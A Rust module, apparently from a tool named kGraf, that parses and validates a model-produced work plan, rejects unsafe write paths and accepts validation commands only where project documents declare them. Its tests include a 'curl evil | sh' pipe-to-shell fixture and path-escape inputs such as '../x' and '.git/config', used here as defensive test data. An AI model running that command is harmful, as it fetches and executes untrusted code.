//! The plan model: what the interpretation call answers, its parsing and
//! validation, and the assessment of each acceptance criterion and validation
//! command.
//!
//! **Strict parsing (fail loud).** Every answer struct denies unknown fields: a
//! misspelled field (`evidences`, `chek`, `validation_command`) is an error, never a
//! silently empty default that would, for example, leave a plan with no validation
//! commands and no evidence.
//!
//! Two assessments are mechanical, not the model's say-so:
//!
//! - **A validation command is discovered only when a project document declares it
//!   as a whole command:** a whole inline code span, a whole line of a fenced code
//!   block, a whole line after a `$ ` prompt, or, weakest, **a whole line of prose
//!   that is exactly the command** (a README line that reads `make check` and
//!   nothing else). Substrings never count (`ls` is not declared by "tools"), and
//!   vendored paths (`third_party/`, `vendor/`, `node_modules/`) are not the
//!   project's documents. Each discovered command records which of these forms
//!   declared it ([`DeclaredAs`]), and the reading shows it, so a command found only
//!   as a prose line is visible as such before it becomes a gate. Validation commands "are discovered, never invented". A command the model names
//!   that no document declares is *proposed*; it becomes a gate only when the user
//!   accepts it by name at approval.
//! - **A criterion is mechanically verifiable only if it names a check kGraf
//!   can run or look up**: a declared command, a test, a symbol or a path. Anything
//!   else is flagged with the reason and what would be needed, and is never treated
//!   as met.

use crate::error::InterpretError;
use serde::{Deserialize, Serialize};
use std::collections::{BTreeMap, BTreeSet, HashMap};
use std::path::{Component as PathComponent, Path};

/// One planned component.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Component {
    pub id: String,
    pub name: String,
    #[serde(default)]
    pub purpose: String,
    /// Where it lives or will live, relative to the root.
    #[serde(default)]
    pub paths: Vec<String>,
}

/// A rule the documents state that binds all work.
///
/// **Demonstrably binds (decision 0013).** A constraint naming
/// `forbidden_paths` is not decoration: [`crate::approve::Interpretation::approve`]
/// strips any of a work item's declared `writes` that fall under one, so no
/// item can ever be seeded asking a worker to write there, and the existing
/// write-scope check (`kgraf-host`'s `scope_violations`, unchanged) refuses any
/// attempt outside declared writes regardless. A constraint with no
/// `forbidden_paths` (most of them: "no kanban" names a behavior, not a path)
/// still reaches every worker's instruction, but nothing mechanical enforces
/// it; that gap is the pass's own limit, not this one's.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Constraint {
    pub text: String,
    #[serde(default)]
    pub source: Option<String>,
    /// Paths, or path prefixes, the documents forbid any work from writing to.
    /// Relative, inside the root, never a protected path (checked the same way
    /// a work item's own `writes` are, [`relative_inside`]).
    #[serde(default)]
    pub forbidden_paths: Vec<String>,
}

/// A validation command the model read (or proposes).
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct ValidationCommand {
    pub command: String,
    #[serde(default)]
    pub source: Option<String>,
}

/// A check kGraf can run or look up.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "kind", rename_all = "snake_case", deny_unknown_fields)]
pub enum Check {
    /// A validation command whose exit status decides the criterion.
    Command { command: String },
    /// A named test that must exist and pass.
    Test { name: String },
    /// A symbol that must exist in the code graph.
    Symbol { name: String },
    /// A path that must exist.
    Path { path: String },
    /// Needs a person (or something not yet available).
    Manual,
}

/// One acceptance criterion.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Criterion {
    pub text: String,
    #[serde(default)]
    pub check: Option<Check>,
    /// For a criterion without a mechanical check: what would be needed to check
    /// it automatically.
    #[serde(default)]
    pub needs: Option<String>,
}

/// What would exist in the code when an item is done.
#[derive(Clone, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Evidence {
    #[serde(default)]
    pub paths: Vec<String>,
    #[serde(default)]
    pub symbols: Vec<String>,
    #[serde(default)]
    pub tests: Vec<String>,
}

impl Evidence {
    pub fn is_empty(&self) -> bool {
        self.paths.is_empty() && self.symbols.is_empty() && self.tests.is_empty()
    }
}

/// What the documents say about an item's state. Recorded to be compared with
/// derived doneness, never used as doneness.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum Claim {
    Complete,
    Partial,
    NotStarted,
    #[default]
    Unstated,
}

/// One work item.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct WorkItem {
    pub id: String,
    pub title: String,
    #[serde(default)]
    pub component: Option<String>,
    pub instruction: String,
    #[serde(default)]
    pub depends_on: Vec<String>,
    pub acceptance: Vec<Criterion>,
    #[serde(default)]
    pub evidence: Evidence,
    /// Files the work will write, relative to the root.
    #[serde(default)]
    pub writes: Vec<String>,
    #[serde(default)]
    pub documents_claim: Claim,
    /// Where in the corpus it comes from (`path` or `path#heading`).
    #[serde(default)]
    pub sources: Vec<String>,
}

/// The interpretation call's answer.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(deny_unknown_fields)]
pub struct Answer {
    /// The project as read, stated back to the user.
    pub reading: String,
    #[serde(default)]
    pub components: Vec<Component>,
    #[serde(default)]
    pub constraints: Vec<Constraint>,
    #[serde(default)]
    pub validation_commands: Vec<ValidationCommand>,
    #[serde(default)]
    pub work_items: Vec<WorkItem>,
    /// Scoping questions for the user (greenfield, or where the corpus is silent).
    #[serde(default)]
    pub questions: Vec<String>,
}

fn excerpt(text: &str) -> String {
    text.chars().take(200).collect()
}

/// Parse an answer: the JSON object from the first `{` to the last `}`, so a code
/// fence around it is tolerated. Anything else, an unknown field included, is
/// refused.
pub fn parse_answer(text: &str) -> Result<Answer, InterpretError> {
    let (Some(start), Some(end)) = (text.find('{'), text.rfind('}')) else {
        return Err(InterpretError::BadAnswer {
            reason: "no JSON object".into(),
            excerpt: excerpt(text),
        });
    };
    if end < start {
        return Err(InterpretError::BadAnswer {
            reason: "no JSON object".into(),
            excerpt: excerpt(text),
        });
    }
    serde_json::from_str(&text[start..=end]).map_err(|e| InterpretError::BadAnswer {
        reason: e.to_string(),
        excerpt: excerpt(text),
    })
}

/// A relative path a worker may write: the runtime's rule
/// (`kgraf_runtime::forbidden_path`), the same one the orchestrator's
/// `validate_plan` and merge-back apply: not absolute, no `..`, nothing under
/// `.git`, `.kgraf` or another protected name however it is spelled.
pub fn relative_inside(path: &str) -> bool {
    !path.trim().is_empty() && !kgraf_runtime::forbidden_path(Path::new(path.trim()))
}

/// Whether `path` is `prefix` itself or nested under it, compared the way a
/// worker's write scope already is ([`kgraf_core::paths::fold_path`]): case-
/// and normalization-insensitively, component by component, so a constraint
/// naming `Legacy/` still forbids `legacy/x.rs` on a case-insensitive volume.
pub fn path_under(path: &str, prefix: &str) -> bool {
    let path = kgraf_core::paths::fold_path(Path::new(path.trim()));
    let prefix = kgraf_core::paths::fold_path(Path::new(prefix.trim()));
    if prefix.is_empty() {
        return false;
    }
    path == prefix || path.starts_with(&format!("{prefix}/"))
}

/// Limits a plan must meet to be dispatched, checked when it is interpreted
/// rather than first at the start of a run.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct PlanLimits {
    /// Most work items one plan may hold: the orchestrator's contracts-per-plan
    /// cap (`OrchestratorConfig::max_contracts_per_plan`, default 32).
    pub max_items: usize,
}

impl Default for PlanLimits {
    fn default() -> Self {
        Self { max_items: 32 }
    }
}

/// Validate an answer: ids present, well formed and unique, components known,
/// dependencies known, not on themselves and acyclic, every item with an
/// instruction and at least one criterion, writes the runtime would accept, at
/// most `limits.max_items` items. A plan with no items is valid only with
/// questions (a scoping round).
pub fn validate_answer(answer: &Answer, limits: &PlanLimits) -> Result<(), InterpretError> {
    let invalid = |s: String| Err(InterpretError::InvalidPlan(s));
    if answer.reading.trim().is_empty() {
        return invalid("the reading is empty".into());
    }
    if answer.work_items.is_empty() && answer.questions.is_empty() {
        return invalid("no work items and no questions".into());
    }
    if answer.work_items.len() > limits.max_items {
        return invalid(format!(
            "the plan has {} work items; at most {} are accepted per plan",
            answer.work_items.len(),
            limits.max_items
        ));
    }
    let mut components = BTreeSet::new();
    for c in &answer.components {
        if c.id.trim().is_empty() {
            return invalid("a component has no id".into());
        }
        if !components.insert(c.id.as_str()) {
            return invalid(format!("component id `{}` repeats", c.id));
        }
    }
    for c in &answer.constraints {
        for p in &c.forbidden_paths {
            if !relative_inside(p) {
                return invalid(format!(
                    "a constraint forbids the path `{p}`, which is not a relative path inside \
                     the root, or is already protected"
                ));
            }
        }
    }
    let mut ids = BTreeSet::new();
    for w in &answer.work_items {
        if w.id.trim().is_empty() {
            return invalid("a work item has no id".into());
        }
        if !w
            .id
            .chars()
            .all(|c| c.is_ascii_alphanumeric() || c == '-' || c == '_' || c == '.')
            || w.id.starts_with('.')
        {
            return invalid(format!(
                "work item id `{}` must be letters, digits, `-`, `_` and `.`, not starting with `.`",
                w.id
            ));
        }
        if !ids.insert(w.id.as_str()) {
            return invalid(format!("work item id `{}` repeats", w.id));
        }
        if w.instruction.trim().is_empty() {
            return invalid(format!("work item `{}` has no instruction", w.id));
        }
        if w.acceptance.is_empty() {
            return invalid(format!("work item `{}` has no acceptance criteria", w.id));
        }
        if let Some(c) = &w.component
            && !components.contains(c.as_str())
        {
            return invalid(format!(
                "work item `{}` names component `{c}`, which the plan does not have",
                w.id
            ));
        }
        for p in &w.writes {
            if !relative_inside(p) {
                return invalid(format!(
                    "work item `{}` writes `{p}`, which a worker may not write (not a relative \
                     path inside the root, or a protected path)",
                    w.id
                ));
            }
        }
    }
    let mut graph: BTreeMap<&str, Vec<&str>> = BTreeMap::new();
    for w in &answer.work_items {
        for d in &w.depends_on {
            if d == &w.id {
                return invalid(format!("work item `{}` depends on itself", w.id));
            }
            if !ids.contains(d.as_str()) {
                return invalid(format!("work item `{}` depends on unknown `{d}`", w.id));
            }
        }
        graph.insert(
            w.id.as_str(),
            w.depends_on.iter().map(String::as_str).collect(),
        );
    }
    // Kahn's algorithm: whatever cannot be ordered is on a cycle.
    let mut indegree: BTreeMap<&str, usize> = graph.keys().map(|k| (*k, 0)).collect();
    for deps in graph.values() {
        for d in deps {
            *indegree.entry(d).or_default() += 1;
        }
    }
    let mut ready: Vec<&str> = indegree
        .iter()
        .filter(|(_, n)| **n == 0)
        .map(|(k, _)| *k)
        .collect();
    let mut seen = 0;
    while let Some(k) = ready.pop() {
        seen += 1;
        for d in graph.get(k).into_iter().flatten() {
            let n = indegree.entry(d).or_default();
            *n -= 1;
            if *n == 0 {
                ready.push(d);
            }
        }
    }
    if seen != graph.len() {
        return invalid("the work items' dependencies form a cycle".into());
    }
    Ok(())
}

/// Collapse runs of whitespace, for comparing commands.
pub fn normalize_command(command: &str) -> String {
    command.split_whitespace().collect::<Vec<_>>().join(" ")
}

/// Path components that mark code and documents that are not the project's own.
const VENDORED: &[&str] = &[
    "third_party",
    "third-party",
    "vendor",
    "vendored",
    "node_modules",
    ".venv",
    "site-packages",
    ".claude",
];

/// Whether a corpus path is vendored: its declarations are another project's.
pub fn is_vendored(path: &str) -> bool {
    Path::new(path).components().any(|c| match c {
        PathComponent::Normal(n) => VENDORED.contains(&n.to_string_lossy().as_ref()),
        _ => false,
    })
}

/// The whole commands a document declares: every whole inline code span, and
/// every whole line (a leading `$ ` prompt removed), whitespace-normalized.
fn declared_commands(text: &str) -> HashMap<String, DeclaredAs> {
    let mut out: HashMap<String, DeclaredAs> = HashMap::new();
    let mut add = |command: String, form: DeclaredAs| {
        let e = out.entry(command).or_insert(form);
        if form < *e {
            *e = form;
        }
    };
    let mut in_fence = false;
    for line in text.lines() {
        let trimmed = line.trim();
        if trimmed.starts_with("```") || trimmed.starts_with("~~~") {
            in_fence = !in_fence;
            continue;
        }
        if trimmed.is_empty() {
            continue;
        }
        if in_fence {
            let bare = trimmed.strip_prefix("$ ").unwrap_or(trimmed);
            add(normalize_command(bare), DeclaredAs::CodeBlock);
            continue;
        }
        match trimmed.strip_prefix("$ ") {
            Some(bare) => add(normalize_command(bare), DeclaredAs::PromptLine),
            None => add(normalize_command(trimmed), DeclaredAs::ProseLine),
        }
        for (i, span) in trimmed.split('`').enumerate() {
            if i % 2 == 1 && !span.trim().is_empty() {
                add(normalize_command(span), DeclaredAs::CodeSpan);
            }
        }
    }
    out
}

/// How a document declared a command, strongest first.
#[derive(Clone, Copy, Debug, PartialEq, Eq, PartialOrd, Ord, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum DeclaredAs {
    /// A whole inline code span: `` `cargo test` ``.
    CodeSpan,
    /// A whole line of a fenced code block.
    CodeBlock,
    /// A whole line after a `$ ` prompt.
    PromptLine,
    /// A whole line of prose that is exactly the command: the weakest form.
    ProseLine,
}

impl DeclaredAs {
    pub fn describe(self) -> &'static str {
        match self {
            DeclaredAs::CodeSpan => "a code span",
            DeclaredAs::CodeBlock => "a code block line",
            DeclaredAs::PromptLine => "a `$ ` prompt line",
            DeclaredAs::ProseLine => "a whole prose line, not marked as code",
        }
    }
}

/// Where a validation command came from.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "provenance", rename_all = "snake_case")]
pub enum CommandProvenance {
    /// Declared as a whole command in this project document, in this form.
    Discovered {
        path: String,
        declared_as: DeclaredAs,
    },
    /// Named by the model and declared by no project document: a proposal the
    /// user accepts by name, or not at all.
    Proposed,
}

/// A validation command with its provenance checked.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
pub struct AssessedCommand {
    pub command: String,
    pub provenance: CommandProvenance,
}

/// Check each command against the corpus: discovered when a non-vendored document
/// declares it as a whole command (see the module documentation), else proposed.
pub fn assess_commands<'a>(
    commands: &[ValidationCommand],
    corpus: impl Iterator<Item = (&'a str, &'a str)>,
) -> Vec<AssessedCommand> {
    let mut out: Vec<AssessedCommand> = Vec::new();
    let wanted: Vec<String> = commands
        .iter()
        .map(|c| normalize_command(&c.command))
        .filter(|c| !c.is_empty())
        .collect();
    let mut found: BTreeMap<&str, (String, DeclaredAs)> = BTreeMap::new();
    if !wanted.is_empty() {
        for (path, text) in corpus {
            if is_vendored(path) {
                continue;
            }
            let declared = declared_commands(text);
            for w in &wanted {
                if let Some(form) = declared.get(w) {
                    let better = found.get(w.as_str()).is_none_or(|(_, f)| form < f);
                    if better {
                        found.insert(w.as_str(), (path.to_owned(), *form));
                    }
                }
            }
        }
    }
    for command in &wanted {
        if out.iter().any(|o| &o.command == command) {
            continue;
        }
        out.push(AssessedCommand {
            command: command.clone(),
            provenance: match found.get(command.as_str()) {
                Some((path, declared_as)) => CommandProvenance::Discovered {
                    path: path.clone(),
                    declared_as: *declared_as,
                },
                None => CommandProvenance::Proposed,
            },
        });
    }
    out
}

/// Whether a criterion can be checked automatically.
#[derive(Clone, Debug, PartialEq, Eq, Serialize, Deserialize)]
#[serde(tag = "verifiable", rename_all = "snake_case")]
pub enum Verifiability {
    /// kGraf can run or look this up.
    Mechanical { check: Check },
    /// It cannot; reported with why and what would be needed, never treated as
    /// met.
    Unverifiable { reason: String, needs: String },
}

/// Assess one criterion against the declared commands (discovered ones, plus
/// proposed ones the user accepted by name).
pub fn assess_criterion(criterion: &Criterion, declared: &BTreeSet<String>) -> Verifiability {
    let needs = |default: &str| {
        criterion
            .needs
            .clone()
            .filter(|n| !n.trim().is_empty())
            .unwrap_or_else(|| default.to_owned())
    };
    match &criterion.check {
        Some(Check::Command { command }) => {
            let command = normalize_command(command);
            if declared.contains(&command) {
                Verifiability::Mechanical {
                    check: Check::Command { command },
                }
            } else {
                Verifiability::Unverifiable {
                    reason: format!(
                        "it names `{command}`, which the project does not declare as a validation command"
                    ),
                    needs: needs(
                        "a validation command the project's documents declare, or your acceptance of this one by name",
                    ),
                }
            }
        }
        Some(Check::Test { name }) if !name.trim().is_empty() => Verifiability::Mechanical {
            check: Check::Test { name: name.clone() },
        },
        Some(Check::Symbol { name }) if !name.trim().is_empty() => Verifiability::Mechanical {
            check: Check::Symbol { name: name.clone() },
        },
        Some(Check::Path { path }) if relative_inside(path) => Verifiability::Mechanical {
            check: Check::Path { path: path.clone() },
        },
        Some(Check::Manual) => Verifiability::Unverifiable {
            reason: "it needs judgment no command, test, symbol or path captures".into(),
            needs: needs("a person to check it, or a test that encodes it"),
        },
        Some(_) => Verifiability::Unverifiable {
            reason: "its check names nothing usable (an empty name, or a path outside the root)"
                .into(),
            needs: needs("a command, test, symbol or path that shows it holds"),
        },
        None => Verifiability::Unverifiable {
            reason: "it names no check".into(),
            needs: needs("a command, test, symbol or path that shows it holds"),
        },
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn item(id: &str, deps: &[&str]) -> WorkItem {
        WorkItem {
            id: id.into(),
            title: id.into(),
            component: None,
            instruction: format!("do {id}"),
            depends_on: deps.iter().map(|d| (*d).to_owned()).collect(),
            acceptance: vec![Criterion {
                text: "tests pass".into(),
                check: None,
                needs: None,
            }],
            evidence: Evidence::default(),
            writes: vec![],
            documents_claim: Claim::Unstated,
            sources: vec![],
        }
    }

    fn answer(items: Vec<WorkItem>) -> Answer {
        Answer {
            reading: "a project".into(),
            components: vec![],
            constraints: vec![],
            validation_commands: vec![],
            work_items: items,
            questions: vec![],
        }
    }

    fn valid(a: &Answer) -> Result<(), InterpretError> {
        validate_answer(a, &PlanLimits::default())
    }

    #[test]
    fn a_fenced_answer_parses_and_prose_is_refused() {
        let text = "Here it is:\n```json\n{\"reading\":\"r\",\"work_items\":[]}\n```";
        assert_eq!(parse_answer(text).expect("parse").reading, "r");
        assert!(matches!(
            parse_answer("I would start with the parser."),
            Err(InterpretError::BadAnswer { .. })
        ));
        assert!(matches!(
            parse_answer("{\"steps\":[]}"),
            Err(InterpretError::BadAnswer { .. })
        ));
    }

    /// A misspelled field
    /// parsed, validated, and left the plan with no commands, no evidence and no
    /// check. Each misspelling is now a parse error.
    #[test]
    fn a_misspelled_field_is_an_error_not_an_empty_default() {
        let base = serde_json::json!({"reading":"r","work_items":[{"id":"a","title":"a",
            "instruction":"do","acceptance":[{"text":"x"}]}]});
        parse_answer(&base.to_string()).expect("the base parses");
        let mut top = base.clone();
        top["validation_command"] = serde_json::json!([{"command": "x"}]);
        let mut evidence = base.clone();
        evidence["work_items"][0]["evidences"] = serde_json::json!({"symbols": ["S"]});
        let mut check = base.clone();
        check["work_items"][0]["acceptance"][0]["chek"] =
            serde_json::json!({"kind": "test", "name": "t"});
        let mut inner = base.clone();
        inner["work_items"][0]["acceptance"][0]["check"] =
            serde_json::json!({"kind": "test", "nam": "t"});
        for bad in [top, evidence, check, inner] {
            assert!(
                matches!(
                    parse_answer(&bad.to_string()),
                    Err(InterpretError::BadAnswer { .. })
                ),
                "{bad}"
            );
        }
    }

    #[test]
    fn cycles_unknown_dependencies_and_bad_writes_are_refused() {
        valid(&answer(vec![item("a", &[]), item("b", &["a"])])).expect("valid");
        assert!(valid(&answer(vec![item("a", &["b"]), item("b", &["a"])])).is_err());
        assert!(valid(&answer(vec![item("a", &["a"])])).is_err());
        assert!(valid(&answer(vec![item("a", &["zz"])])).is_err());
        assert!(valid(&answer(vec![item("a", &[]), item("a", &[])])).is_err());
        assert!(valid(&answer(vec![item("a b", &[])])).is_err());
        assert!(valid(&answer(vec![item(".hidden", &[])])).is_err());
        // The runtime's rule, not a local approximation: protected names however
        // they are spelled.
        for bad in [
            "../x",
            "/abs",
            "src/../../x",
            "",
            ".git/config",
            ".GIT/config",
            "a/.kgraf/x",
            ".githooks/pre-commit",
        ] {
            let mut w = item("a", &[]);
            w.writes = vec![bad.into()];
            assert!(valid(&answer(vec![w])).is_err(), "{bad}");
        }
        let mut w = item("a", &[]);
        w.acceptance.clear();
        assert!(valid(&answer(vec![w])).is_err());
        let mut w = item("a", &[]);
        w.component = Some("ghost".into());
        assert!(valid(&answer(vec![w])).is_err());
        assert!(valid(&answer(vec![])).is_err());
        let mut scoping = answer(vec![]);
        scoping.questions = vec!["Which platform?".into()];
        valid(&scoping).expect("a scoping round");
    }

    #[test]
    fn a_plan_over_the_contract_cap_is_refused_at_interpretation() {
        let items: Vec<WorkItem> = (0..5).map(|i| item(&format!("w{i}"), &[])).collect();
        let a = answer(items);
        assert!(validate_answer(&a, &PlanLimits { max_items: 4 }).is_err());
        validate_answer(&a, &PlanLimits { max_items: 5 }).expect("at the cap");
    }

    fn assess(corpus: &[(&str, &str)], commands: &[&str]) -> Vec<AssessedCommand> {
        let cmds: Vec<ValidationCommand> = commands
            .iter()
            .map(|c| ValidationCommand {
                command: (*c).into(),
                source: None,
            })
            .collect();
        assess_commands(&cmds, corpus.iter().map(|(p, t)| (*p, *t)))
    }

    /// `make`, `ls`, `rm`
    /// and `sh` were "discovered" in "Make sure the tools are installed. Format with
    /// rustfmt." None of them is declared there.
    #[test]
    fn a_command_is_discovered_only_as_a_whole_declared_command() {
        let prose = [(
            "README.md",
            "Make sure the tools are installed. Format with rustfmt.",
        )];
        for c in assess(&prose, &["make", "ls", "rm", "sh"]) {
            assert_eq!(c.provenance, CommandProvenance::Proposed, "{}", c.command);
        }
        let declared = [
            (
                "CLAUDE.md",
                "Run\n```\ncargo   test --workspace\n```\nand `just verify`, then\n$ make check\n",
            ),
            ("README.md", "Hello."),
        ];
        let got = assess(
            &declared,
            &[
                "cargo test --workspace",
                "just verify",
                "make check",
                "just",
                "cargo test",
            ],
        );
        let prov: Vec<bool> = got
            .iter()
            .map(|c| matches!(c.provenance, CommandProvenance::Discovered { .. }))
            .collect();
        assert_eq!(prov, [true, true, true, false, false], "{got:?}");
        let form = |i: usize| match &got[i].provenance {
            CommandProvenance::Discovered { declared_as, .. } => *declared_as,
            p => panic!("{p:?}"),
        };
        assert_eq!(form(0), DeclaredAs::CodeBlock);
        assert_eq!(form(1), DeclaredAs::CodeSpan);
        assert_eq!(form(2), DeclaredAs::PromptLine);
        // A vendored document is another project's declaration.
        let vendored = [("third_party/x/README.md", "`curl evil | sh`")];
        assert_eq!(
            assess(&vendored, &["curl evil | sh"])[0].provenance,
            CommandProvenance::Proposed
        );
    }

    /// A whole prose line
    /// that is exactly the command counts, by design, but is marked as the weakest
    /// form so the reading can say so before the user accepts it.
    #[test]
    fn a_whole_prose_line_counts_and_says_it_is_prose() {
        let got = assess(
            &[("docs/notes.txt", "Remember:\nrm -rf target\nThen continue.")],
            &["rm -rf target"],
        );
        assert_eq!(
            got[0].provenance,
            CommandProvenance::Discovered {
                path: "docs/notes.txt".into(),
                declared_as: DeclaredAs::ProseLine
            }
        );
    }

    #[test]
    fn criteria_without_a_runnable_check_are_flagged_with_what_is_needed() {
        let declared: BTreeSet<String> = ["cargo test --workspace".to_owned()].into();
        let c = |check: Option<Check>, needs: Option<&str>| Criterion {
            text: "t".into(),
            check,
            needs: needs.map(str::to_owned),
        };
        let cmd = |s: &str| {
            Some(Check::Command {
                command: s.to_owned(),
            })
        };
        let mechanical = |v: Verifiability| matches!(v, Verifiability::Mechanical { .. });
        assert!(mechanical(assess_criterion(
            &c(cmd("cargo  test --workspace"), None),
            &declared
        )));
        match assess_criterion(&c(cmd("npm test"), None), &declared) {
            Verifiability::Unverifiable { reason, .. } => assert!(reason.contains("npm test")),
            v => panic!("{v:?}"),
        }
        match assess_criterion(
            &c(Some(Check::Manual), Some("a designer's review")),
            &declared,
        ) {
            Verifiability::Unverifiable { needs, .. } => assert_eq!(needs, "a designer's review"),
            v => panic!("{v:?}"),
        }
        assert!(!mechanical(assess_criterion(&c(None, None), &declared)));
        let path = |p: &str| Some(Check::Path { path: p.to_owned() });
        assert!(!mechanical(assess_criterion(
            &c(path("../etc"), None),
            &declared
        )));
        let symbol = Some(Check::Symbol {
            name: "Ledger".into(),
        });
        assert!(mechanical(assess_criterion(&c(symbol, None), &declared)));
    }

    /// Decision 0013: a constraint's `forbidden_paths` is validated the same
    /// way a work item's own `writes` are; an escaping or protected path is
    /// refused at validation, before it could ever look like it binds anything.
    #[test]
    fn a_constraints_forbidden_path_is_validated_like_a_write() {
        let mut a = answer(vec![item("w1", &[])]);
        a.constraints = vec![Constraint {
            text: "no writes above the root".into(),
            source: None,
            forbidden_paths: vec!["../outside".into()],
        }];
        assert!(matches!(valid(&a), Err(InterpretError::InvalidPlan(_))));

        a.constraints[0].forbidden_paths = vec!["legacy/".into()];
        assert!(valid(&a).is_ok());
    }

    #[test]
    fn path_under_compares_case_and_separator_insensitively() {
        assert!(path_under("legacy/old.rs", "legacy/"));
        assert!(path_under("Legacy/old.rs", "legacy"));
        assert!(path_under("legacy", "legacy"));
        assert!(!path_under("legacyplus/old.rs", "legacy"));
        assert!(!path_under("src/legacy.rs", "legacy"));
        assert!(!path_under("src/a.rs", ""));
    }
}
